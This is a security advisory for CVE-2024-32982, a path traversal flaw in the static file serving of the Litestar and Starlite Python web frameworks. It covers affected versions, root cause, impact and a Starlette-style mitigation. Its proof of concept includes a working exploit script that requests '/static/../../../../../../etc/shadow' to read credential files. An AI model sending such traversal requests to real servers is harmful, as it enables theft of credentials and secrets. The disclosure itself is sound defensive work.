# Litestar and Starlite vulnerable to Path Traversal

**GHSA**: GHSA-83pv-qr33-2vcf | **CVE**: CVE-2024-32982 | **Severity**: high (CVSS 8.2)

**CWE**: CWE-22

**Affected Packages**:
- **litestar** (pip): >= 2.8.0, < 2.8.3
- **litestar** (pip): >= 2.7.0, < 2.7.2
- **litestar** (pip): >= 2.0.0, < 2.6.4
- **starlite** (pip): >= 1.37.0, < 1.51.16

## Description

# Summary
**Local File Inclusion via Path Traversal in LiteStar Static File Serving**

A Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.

## Details
The vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).

The function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:

```python
commonpath([str(directory), file_info["name"], joined_path])
```

Given the variables:
```python
directory = PosixPath('/Users/brian/sandbox/test_vuln/static')
file_info["name"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'
joined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')
```

The function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.


## Proof of Concept (PoC)
To reproduce this vulnerability, follow these steps:

1. **Set up the environment:**
   - Install with pip the `uvicorn` and `litestar` packages.
   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.
   - Ensure the static file serving is enabled, which is typically the default configuration.

2. **Preparation of the testing environment:**
   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.
   - Create a `main.py` file with the following content to configure and run the LiteStar server:

    ```python
    from pathlib import Path
    from litestar import Litestar
    from litestar.static_files import create_static_files_router
    import uvicorn

    app = Litestar(
        route_handlers=[
            create_static_files_router(path="/static", directories=["static"]),
        ],
    )

    if __name__ == "__main__":
        uvicorn.run("main:app", host="0.0.0.0", port=8000)
    ```

   - Run this script with the command `python3 main.py` to start the server.

3. **Exploit:**
   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:

    ```python
    import http.client

    def send_request(host, port, path):
        connection = http.client.HTTPConnection(host, port)
        connection.request("GET", path)
        response = connection.getresponse()
        print(f"Status: {response.status}")
        print(f"Headers: {response.getheaders()}")
        data = response.read()
        print(f"Body: {data.decode('utf-8')}")
        connection.close()

    send_request("localhost", 8000, "/static/../../../../../../etc/shadow")
    ```

   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.

4. **Observe:**
   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.
   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.


## Impact

This Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:

1. **Exposure of Sensitive Information:**
   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.

2. **Potential for System Compromise:**
   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.

3. **Credential Leakage:**
   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.

4. **Regulatory and Compliance Violations:**
   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.

5. **Loss of Trust and Reputation Damage:**
   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.

6. **Potential for Further Exploitation:**
   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.



Here's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:


## Mitigation Suggestion

To effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:

1. **Input Validation and Sanitization:**
   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.
   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.

2. **Path Normalization:**
   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.
   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:
     ```python
     if os.path.commonpath([full_path, directory]) != directory:
         # Don't allow misbehaving clients to break out of the static files
         # directory.
         continue
     ```
     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.


## Comments
**Naming Convention:**
- From versions 0.X.X through 1.X.X, the package was released under the name "starlite."
- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name "litestar."

**Feature Additions and Changes:**
- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.
- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.
